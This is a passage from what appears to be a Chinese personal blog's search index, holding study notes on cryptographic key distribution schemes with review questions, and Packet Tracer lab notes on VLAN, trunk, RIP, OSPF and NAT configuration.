密钥分配体制</h4><p><strong>集中式密钥分配体制</strong><br>集中式分配体制是引入一个中心服务器（通常称作密钥分配中<br>心或KDC），在这个体系中，团体中的任何一个实体与中心服务 器共享一个密钥。在这样的系统中，需要存储的密钥数量和团体 的人数量差不多，KDC接受用户的请求，为用户提供安全的密钥 分配服务。它的典型代表是Kerboros协议。</p><p><strong>分布式密钥分配体制</strong><br>分布式分配体制中网络中的主机具有相同的地位，他们之间的 密钥分配取决于他们之间的协商，比较著名的有Diffie-Hellman密 钥交换协议，但Diffie-Hellman密钥交换协议没有提供鉴别机制，不能抵抗中间人攻击。</p><h4 id="3-3-4密钥分配的基本方法"><a href="#3-3-4密钥分配的基本方法" class="headerlink" title="3.3.4密钥分配的基本方法"></a>3.3.4密钥分配的基本方法</h4><p>对于通信双方A和B，密钥分配可以有以下几种方法：<br><strong>1</strong> 密钥由A选定，然后通过物理方法安全地传递给B。<br><strong>2</strong> 密钥由可信赖的第三方C选取并通过物理方法安全地发送给A 和B。<br><strong>3</strong> 如果A和B事先已有一密钥，那么其中一方选取新密钥后，用已有的密钥加密新密钥发送给另一方。<br><strong>4</strong> 如果A和B都有一个到可信赖的第三方C的保密信道，那么C就可以为A和B选取密钥后安全地发送给A和B。<br><strong>5</strong> 如果A和B都在可信赖的第三方C发布自己的公开密钥，那么 他们用彼此的公开密钥进行保密通信。</p><h4 id="3-3-5对称密码技术的密钥分配方案"><a href="#3-3-5对称密码技术的密钥分配方案" class="headerlink" title="3.3.5对称密码技术的密钥分配方案"></a>3.3.5对称密码技术的密钥分配方案</h4><p>ANSI X9.17定义了三层密钥层次结构：<br>1）主密钥（KKMs），通过手工分配；</p><p>2）密钥加密密钥（KKs），通过在线分配；</p><p>3）数据密钥（KDs）。</p><h5 id="对称密码技术的密钥分配方案："><a href="#对称密码技术的密钥分配方案：" class="headerlink" title="对称密码技术的密钥分配方案："></a>对称密码技术的密钥分配方案：</h5><p>（1）集中式密钥分配方案</p><p><img src="https://s2.loli.net/2024/11/03/8WwL9POfmzdjFDl.jpg" alt="10.jpg"></p><p>（2）分布式密钥分配方案</p><p>  分布式密钥分配方案是指网络通信中各个通信方具有相同的地位，它们之间的密钥分配取决于它们之间的协商，不受何其 他方的限制。这种密钥分配方案要求有n个通信方的网络需要 保存[n(n-1)&#x2F;2]个主密钥，对于较大型的网络，这种方案是不适用的，但是在<span style = "color: blue;">一个小型网络或一个大型网络的局部范围</span>内，这种方案还是有用的。</p><p><img src="https://s2.loli.net/2024/11/03/4TE9Yca6JqM8vNL.jpg" alt="11.jpg"></p><h4 id="3-3-6非对称密码技术的密钥分配方案"><a href="#3-3-6非对称密码技术的密钥分配方案" class="headerlink" title="3.3.6非对称密码技术的密钥分配方案"></a>3.3.6非对称密码技术的密钥分配方案</h4><h4 id="1-公钥的分配："><a href="#1-公钥的分配：" class="headerlink" title="(1)公钥的分配："></a><strong>(1)公钥的分配：</strong></h4><ol><li><p><strong>分开发布</strong></p><p> 公开发布:是指用户将自己的公钥发送给另外一个参与 者，或者把公钥广播给相关人群。</p><p>这种方法有一个非常大的缺 点:任何人都可以伪造一个公钥冒充他人。</p></li><li><p><strong>公用目录</strong><br> 由一个可信任的系统或组织建立和管理维护公用目录，该公用目录维持一个公开动态目录。公用目录为每个参与者维护一 个目录项{标识符，公钥}，每个目录项的信息必须进行安全认 证。<strong>任何人</strong>都可以从这里获得需要保密通信的公钥。与公开发布公钥相比，这种方法的安全性高一些。</p><p>但也有一个致命的弱点， 如果攻击者成功地得到目录管理机构的私钥，就可以伪造公钥， 并发送给给其他人达到欺骗的目的</p></li><li><p><strong>公钥机构</strong></p></li></ol><p>​ 为更严格控制公钥从目录分配出去的公钥更加安全，为此需 要引入一个公钥管理机构<strong>来为各个用户建立、维护和控制动态的公用目录</strong>。与单纯的公用目录相比，该方法的安全性更高。但这 种方式也有它的缺点:由于每个用户要想和其他人通信都需求助 于公钥管理机构，因而管理机构可能会成为系统的瓶颈，而且由 管理机构维护的公用目录也容易被攻击者攻击。</p><ol start="4"><li><strong>公钥证书</strong></li></ol><p>  在不与公钥管理机构通信，又能证明其他通信方的公钥的可信度，实际上完全解决了公开发布及公用目录的安全问题。</p><p>采 用公钥证书是为了解决公开密钥管理机构的瓶颈问题。<br>公钥证书即数字证书是由授权中心CA(Certificate Authority)颁发的。</p><p><strong>证书的形式为CA&#x3D;ESKCA[T，IDA， PKA]，其中IDA是用户A的身份标识符，PKA是A的公钥，T是 当前时间戳，SKCA是CA的私钥。</strong></p><p>ps:公钥证书的发放过程：</p><p><img src="https://s2.loli.net/2024/11/05/cfoI9pu7gF6Cvhe.jpg" alt="12.jpg"></p><h4 id="2-利用非对称密码技术进行对称密码技术密钥的分配"><a href="#2-利用非对称密码技术进行对称密码技术密钥的分配" class="headerlink" title="(2)利用非对称密码技术进行对称密码技术密钥的分配:"></a>(2)利用非对称密码技术进行对称密码技术密钥的分配:</h4><ol><li><span style="color :blue;">简单分配:</span></li></ol><p>下图就是用 <strong>非对称密码技术建立会话密钥</strong> 的过程。</p><p><img src="https://s2.loli.net/2024/11/05/p32OPtFx451XISa.jpg" alt="13.jpg"></p><p>但这一分配方案容易 遭到主动攻击，假如攻击者已 经接入A和B双方的通信信 道，可以轻易地截获A、B双 方的通信。</p><ol start="2"><li><p><span style="color :blue;">具有保密和认证功能的密钥分配:</span></p><p>针对简单分配密钥的缺点，人们又设计了<strong>具有保密和认证功能的非对称密码技术的密钥分配</strong>，如下图所示。</p><p><img src="https://s2.loli.net/2024/11/05/mxbtqU9RHKOZNVg.jpg" alt="14.jpg"></p><p>密钥分配过程既具有保密性，又具有认证性，因此既可以防止被动攻击，也可以防止主动攻击。</p></li></ol><h2 id="题："><a href="#题：" class="headerlink" title="题："></a>题：</h2><p>1.请分析网络信息安全非常重要的原因。</p><p>2.请说明网络信息安全的内涵、特征及网络信息安全问题的原因。</p><p>3.请说明网络信息安全的目标和功能是什么。</p><p>4.请说明信息安全技术需求和安全策略。</p><p>5.请说明信息安全与区块链安全的区别和联系。</p><p>6.请说明近几年国内出台了哪些网络相关法律，这些法律的出台有什么重要意义。</p><ol><li><p>比较对称密码算法和非对称密码算法的优缺点，考虑在异地的两个人如何通过不可信的网络信道传输信息？</p></li><li><p>两个交易者A和B，假设B没有A的电话或邮箱的前提下，B如何相信A在网上发布的公钥就是真真的A发布的公钥，而不是C假冒A发布的？</p></li><li><p>请说明密码学在信息安全领域有哪些作用。</p></li><li><p>请说明密码系统的组成及它们之间的关系。</p></li><li><p>请说明如何认识密码系统的安全性。</p></li><li><p>请说明密码分析者对密码技术的攻击方式有哪些，并简要说明？</p></li><li><p>给定DES算法，在平均意义下，有多少个密钥可以把一个指定的输入分组加密得到一个指定的输出分组？</p></li><li><p>什么是非对称加密？和对称加密的区别？它的工作原理是什么？</p></li><li><p>利用 ab mod n&#x3D;((a mod n)(b mod n)) mod n,能把35^77 mod<br>83所需的76次乘法运算化简到11次吗，还可以进一步化简吗。</p></li><li><p>选择两个素数p &#x3D; 7和 q &#x3D; 11。计算n 和 φ（n）；选择公钥指数e&#x3D;17。计算私钥指数d；加密明文消息m&#x3D;5，计算密文。</p></li><li><p>为什么要引进密钥管理技术？</p></li><li><p>密钥管理系统涉及到密钥管理的哪些方面？</p></li><li><p>什么是密钥托管？</p></li><li><p>简述分布式密钥分配方案的过程。</p></li><li><p>简述集中式密钥分配方案的过程，并分析可能存在的潜在威胁。</p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 区块链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【学习笔记】简单网络结构的搭建/vlan配置</title>
      <link href="/2024/10/23/vlan%E9%85%8D%E7%BD%AE/"/>
      <url>/2024/10/23/vlan%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<p>(重新粗糙存档一下，过程图基本都丢失了，仅用于个人学习笔记使用)</p><ol><li>网络基础架构图</li><li>网络通信的原理</li><li>软件的使用</li></ol><p>​       a. 关于拓扑图： 接入层交换机，汇聚层交换机</p><p>​        b.技术实现6要求</p><h3 id="Vlan-trunk-不同vlan间的通信（三层交换技术）"><a href="#Vlan-trunk-不同vlan间的通信（三层交换技术）" class="headerlink" title="Vlan trunk 不同vlan间的通信（三层交换技术）"></a>Vlan trunk 不同vlan间的通信（三层交换技术）</h3><h4 id="交换机的基础命令-知识："><a href="#交换机的基础命令-知识：" class="headerlink" title="交换机的基础命令&#x2F;知识："></a>交换机的基础命令&#x2F;知识：</h4><ol><li><p>vlan: 虚拟局域网</p></li><li><p>vlan trunk stp 链路聚合</p></li><li><p>hsrp(vrrp)——公司内部的网络系统</p></li><li><p>将pc1和pc2放入不同vlan可以实现隔离</p><p>(同一虚拟网之间的电脑可以通信，不同的不可通信)</p></li><li><p>vlan范围： 1-4094</p></li><li><p><strong>关于常见接口类型：</strong></p></li></ol><p>​交换机常见接口类型：有Access和trunk</p><p>​Access用来接入终端，电脑，打印机，服务器</p><p>​trunk用在交换机与交换机之间</p><p>​trunk技术解决交换机之间传输vlan数据的问题</p><ol start="7"><li>命令行敲错后，跳出卡顿：ctrl+shift+1</li></ol><ul><li><p>三种模式：</p><ol><li><p>Enable </p></li><li><p>#</p></li><li><p>Config</p></li></ol></li><li><p>Exit 退出</p></li><li><p>查看都在#模式中；</p></li><li><p>配置文件的查看：<code>show run (running-config)</code></p></li><li><p>查看交换机的所有接口：<code>show IP interface brief</code></p></li><li><p>查看vlan：<code>show vlan</code></p></li><li><p>批量建立vlan两种办法: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vlan batch 1 to 30</span><br><span class="line"></span><br><span class="line">vlan batch 1 3 5 7 9</span><br></pre></td></tr></table></figure></li><li><p>默认情况下交换机所有端口都在：<code>vlan1</code> (1003-1005为特殊接口)（端口默认用在同一vlan中）</p></li><li><p>修改配置文件（配置在config）：</p></li><li><p>删除操作： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">no switch mode access</span><br></pre></td></tr></table></figure></li><li><p>删除vlan: <code>Switch(config)#no vlan x</code></p></li><li><p>文件的保存：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Switch#write</span><br><span class="line">Building configuration...</span><br></pre></td></tr></table></figure></li><li><p>重启命令：<code>reload</code></p></li><li><p>Ping网络：计算机 &gt; conmand prompt</p><p>（可通过ping另一pc的地址可以查看是否通路）</p></li><li><p>Trunk技术：承载不同的vlan，一般配置在交换机与交换机之间相连的端口</p></li><li><p>还原：先<code>show run</code>，然后复制文本到别处编辑（添加no），再粘贴回去</p><p>（show run也可用于检查）</p></li></ul><h5 id="关于汇聚层步骤的补充："><a href="#关于汇聚层步骤的补充：" class="headerlink" title="关于汇聚层步骤的补充："></a>关于汇聚层步骤的补充：</h5><ul><li><p><code>Ip addr</code> 的地址不是电脑的地址，是第三行需要输入的交换机的地址</p></li><li><p>当需要同时配置如：<code>f0/1</code> 和 <code>f0/2</code> 两个端口时，输入 <code>interface range f0/1,f0/2</code></p><p>设置网关：</p><p><img src="https://s2.loli.net/2024/10/23/Ln2vrqQdEgyRh1B.png" alt="vlan001.png"></p></li></ul><h5 id="对于服务器接入交换机："><a href="#对于服务器接入交换机：" class="headerlink" title="对于服务器接入交换机："></a>对于服务器接入交换机：</h5><ol><li>创建vlan</li><li>将接计算机的接口加入相应的vlan</li><li>配ip</li><li>ip routing</li></ol><p>展示路由表：<code>Show ip route</code></p><p>路由器中：</p><ol><li>添加模块时记得关电源</li><li>添加NM-4E</li></ol><p>手机：静态路由</p><p>工具：动态路由</p><p>以下三步以下图为例：</p><p><img src="https://s2.loli.net/2024/10/23/yVzjvkOlrdm3q7o.png" alt="vlan002.png"></p><h4 id="1-接入层（3步）"><a href="#1-接入层（3步）" class="headerlink" title="1. 接入层（3步）"></a>1. <strong>接入层（3步）</strong></h4><ol><li><p>创建vlan</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config</span><br><span class="line">vlan 10</span><br><span class="line">vlan 20</span><br><span class="line">exit</span><br></pre></td></tr></table></figure></li><li><p>接电脑端口加入vlan</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">interface f0/1</span><br><span class="line">switchport mode access</span><br><span class="line">switchport access vlan 10</span><br><span class="line">exit</span><br><span class="line"></span><br><span class="line">interface f0/2</span><br><span class="line">switchport mode access</span><br><span class="line">switchport access vlan 20</span><br><span class="line">exit</span><br></pre></td></tr></table></figure></li><li><p>将连接的端口配trunk</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">interface f0/3</span><br><span class="line">switchport mode trunk</span><br></pre></td></tr></table></figure></li></ol><h4 id="2-汇聚层（2步）"><a href="#2-汇聚层（2步）" class="headerlink" title="2.  汇聚层（2步）"></a>2.  <strong>汇聚层（2步）</strong></h4><ol><li>点击PC——第二行mask——配置ip地址</li><li>在第三行填交换机地址</li></ol><h4 id="3-核心层（4步）"><a href="#3-核心层（4步）" class="headerlink" title="3. 核心层（4步）"></a>3. <strong>核心层（4步）</strong></h4><p>核心层步骤配置的是计算机的网关</p><ol><li><p>创建vlan</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Switch(config)#vlan 10</span><br><span class="line"></span><br><span class="line">Switch(config-vlan)#vlan 20</span><br><span class="line"></span><br><span class="line">Switch(config-vlan)#exit</span><br></pre></td></tr></table></figure></li><li><p>配置trunk</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Switch(config)#interface f0/1(交换机与交换机之间的端口)</span><br><span class="line"></span><br><span class="line">Switch(config-if)#switchport trunk encapsulation dot1q</span><br><span class="line"></span><br><span class="line">Switch(config-if)#switchport mode trunk</span><br><span class="line"></span><br><span class="line">Switch(config-if)#exit</span><br></pre></td></tr></table></figure></li><li><p>开启三层功能(支持网络层)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Switch(config)#ip routing(开启三层功能，支持路由)</span><br></pre></td></tr></table></figure></li><li><p>配置ip地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Switch(config)#interface vlan 10</span><br><span class="line"></span><br><span class="line">Switch(config-if)#ip address 192.168.10.1 255.255.255.0（汇聚层步骤中设置的网关地址）</span><br><span class="line"></span><br><span class="line">Switch(config-if)#exit</span><br><span class="line">Switch(config)#interface vlan 20</span><br><span class="line"></span><br><span class="line">Switch(config-if)#ip address 192.168.20.1 255.255.255.0</span><br></pre></td></tr></table></figure></li></ol><p><img src="https://s2.loli.net/2024/10/23/ei9lZtoRkTVnEBP.png" alt="vlan003.png"></p><h2 id="配置内网"><a href="#配置内网" class="headerlink" title="配置内网"></a>配置内网</h2><ol><li><p><code>show ip route</code>查看带C的路</p></li><li><p>用<code>rip</code>加载带C的路(配置在核心交换机上)（config模式用router ip）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">route rip</span><br><span class="line">Network 192.168.10.0</span><br><span class="line">Network 192.168.20.0</span><br><span class="line">Network 192.168.30.0</span><br><span class="line">Network 192.168.40.0</span><br><span class="line">......</span><br></pre></td></tr></table></figure></li><li><p>上网：电脑的dns server要输入dns的网关</p></li></ol><ul><li>三个server-pc分别代表web、ftp、dns</li></ul><ol start="4"><li><p>在ftp中设置用户名和密码</p></li><li><p>在第三台dns中分别在设置前两个名字（name处填）为 <code>www.web.com</code> 和 <code>www.ftp.com</code></p><ul><li>然后分别添加上各自的ip（Address处填）</li><li>配置完点击Add</li></ul><p><img src="https://s2.loli.net/2024/10/23/g7NeGRLuyYsD3Ih.png" alt="vlan004.png"></p></li><li><p>(判断能否上网)</p><ul><li>在pc——desktop——web browser处输入 <code>www.web.com</code>&#x2F;<code>www.ftp.com</code></li></ul></li><li><p>(登入ftp) 在conmand prompt输入如下图操作</p><p><img src="https://s2.loli.net/2024/10/23/VMkpuQftGOzoB62.png" alt="vlan005.png"></p></li></ol><h2 id="配置路由器"><a href="#配置路由器" class="headerlink" title="配置路由器"></a>配置路由器</h2><p>（注意设置显示接口）</p><p><img src="https://s2.loli.net/2024/10/23/e4obi6ECt7fVsI9.png" alt="vlan006.png"></p><ul><li><p>网段即地名</p></li><li><p><code>Ospt</code>只管公网的网段，无需管内网的网段</p><p>通俗讲：</p><ol><li><p>路由器：一般用在公网的；</p></li><li><p>交换机：一般用在内网的；</p></li></ol></li></ul><h5 id="路由器R0"><a href="#路由器R0" class="headerlink" title="路由器R0"></a>路由器R0</h5><ul><li><p>对于<code>f0/1</code>端口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Switch(config)#router rip </span><br><span class="line">Switch(config-router)#network 192.168.60.0</span><br></pre></td></tr></table></figure></li><li><p>对于<code>f0/0</code>端口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Switch(config)#router rip </span><br><span class="line">Switch(config-router)#network 192.168.70.0</span><br></pre></td></tr></table></figure></li><li><p>对于：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">  Switch(config)#interface f0/4</span><br><span class="line">  Switch(config-if)#no switchport </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">- `Router(config)#interface f0/1`</span><br><span class="line"></span><br><span class="line">  Router(config-if)#no shutdown</span><br><span class="line">  Router(config-if)#ip address 192.168.60.2 255.255.255.0</span><br><span class="line">  </span><br><span class="line">- `Switch(config)#interface f0/7`</span><br><span class="line">  Switch(config-if)#no switchport </span><br><span class="line">  Switch(config-if)#ip address 192.168.70.1 255.255.255.0</span><br><span class="line">- `Router(config)#interface e1/0</span><br><span class="line">  Router(config-if)#no shutdown</span><br><span class="line">  Router(config-if)#ip address 192.168.70.2 255.255.255.0</span><br></pre></td></tr></table></figure></li></ul><h6 id="网络要全通：（路由问题）"><a href="#网络要全通：（路由问题）" class="headerlink" title="网络要全通：（路由问题）"></a>网络要全通：（路由问题）</h6><p>所有三层设备必须要内网的所有网段</p><p>接下来配置外网通</p><p>———————内&#x2F;外网通——————–</p><h4 id="路由器：配置ip-配置路由"><a href="#路由器：配置ip-配置路由" class="headerlink" title="路由器：配置ip 配置路由"></a>路由器：配置ip 配置路由</h4><p>（一下名称参考上图位置，名称不固定）</p><h5 id="R0"><a href="#R0" class="headerlink" title="R0."></a>R0.</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Router(config)#inter e1/0</span><br><span class="line">Router(config-if)#ip addr 100.100.10.1 255.255.255.0</span><br><span class="line">Router(config-if)#exit</span><br><span class="line">Router(config)#inter f0/0</span><br><span class="line">Router(config-if)#ip addr 192.168.70.2 255.255.255.0</span><br><span class="line">Router(config-if)#exit</span><br><span class="line">Router(config)#interf f0/1</span><br><span class="line">Router(config-if)#ip addr 192.168.60.2 255.255.255.0</span><br><span class="line">Router(config-if)#exit</span><br><span class="line">Router(config)#router ospf 1</span><br><span class="line">Router(config-router)#network 100.100.10.0  0.0.0.255 area 0</span><br></pre></td></tr></table></figure><h5 id="R1"><a href="#R1" class="headerlink" title="R1:"></a>R1:</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Router(config)#interface f0/0</span><br><span class="line">Router(config-if)#ip address 100.100.10.2 255.255.255.0</span><br><span class="line">Router(config-if)#no shutdown</span><br><span class="line">Router(config-if)#exit</span><br><span class="line">Router(config)#interface f0/1</span><br><span class="line">Router(config-if)#no shutdown</span><br><span class="line">Router(config-if)#ip address 100.100.20.1 255.255.255.0</span><br><span class="line">Router(config)#router ospf 1</span><br><span class="line">Router(config-router)#network 100.100.10.0 0.0.0.255 area 0</span><br><span class="line">Router(config-router)#network 100.100.20.0 0.0.0.255 area 0</span><br></pre></td></tr></table></figure><h5 id="R2"><a href="#R2" class="headerlink" title="R2:"></a>R2:</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Router(config)#interface f0/0</span><br><span class="line">Router(config-if)#ip address 100.100.20.2 255.255.255.0</span><br><span class="line">Router(config-if)#no shutdown </span><br><span class="line">Router(config-if)#exit</span><br><span class="line">Router(config)#interface f0/1</span><br><span class="line">Router(config-if)#no shutdown</span><br><span class="line">Router(config-if)#ip add 100.100.30.1 255.255.255.0</span><br><span class="line">Router(config)#router ospf 1</span><br><span class="line">Router(config-router)#network 100.100.20.0  0.0.0.255 area 0</span><br></pre></td></tr></table></figure><p>———————外网互通——————–</p><h3 id="内网上网的问题（内部能够访问公网）——–nat网络地址转换"><a href="#内网上网的问题（内部能够访问公网）——–nat网络地址转换" class="headerlink" title="内网上网的问题（内部能够访问公网）——–nat网络地址转换"></a>内网上网的问题（内部能够访问公网）——–nat网络地址转换</h3><h4 id="第一步-控制内网要上网的网段；（将这些网段连上公网）"><a href="#第一步-控制内网要上网的网段；（将这些网段连上公网）" class="headerlink" title="第一步:控制内网要上网的网段；（将这些网段连上公网）"></a>第一步:控制内网要上网的网段；（将这些网段连上公网）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Router(config)#access-list 1 permit 192.168.10.0 0.0.0.255</span><br><span class="line">Router(config)#access-list 1 permit 192.168.20.0 0.0.0.255</span><br><span class="line">Router(config)#access-list 1 permit 192.168.30.0 0.0.0.255</span><br></pre></td></tr></table></figure><h4 id="第二步：做NAT转换"><a href="#第二步：做NAT转换" class="headerlink" title="第二步：做NAT转换"></a>第二步：做NAT转换</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Router(config)#ip nat inside source list 1(内网） interface e1/0（公有地址的接口）</span><br></pre></td></tr></table></figure><h4 id="第三步：指定内外网接口"><a href="#第三步：指定内外网接口" class="headerlink" title="第三步：指定内外网接口"></a>第三步：指定内外网接口</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Router(config)#interface f0/0 （内网接口）</span><br><span class="line">Router(config-if)#ip nat inside</span><br><span class="line">Router(config-if)#exit</span><br><span class="line">Router(config)#interface f0/1  （内网接口）</span><br><span class="line">Router(config-if)#ip nat inside</span><br><span class="line">Router(config-if)#exit</span><br><span class="line">Router(config)#interface e1/0  （公有接口）</span><br><span class="line">Router(config-if)#ip nat outside</span><br></pre></td></tr></table></figure><h5 id="swi0"><a href="#swi0" class="headerlink" title="swi0"></a>swi0</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Switch(config)#ip route 0.0.0.0 0.0.0.0 192.168.70.2</span><br></pre></td></tr></table></figure><h5 id="sw1"><a href="#sw1" class="headerlink" title="sw1"></a>sw1</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Switch(config)#ip route 0.0.0.0 0.0.0.0 192.168.60.2</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
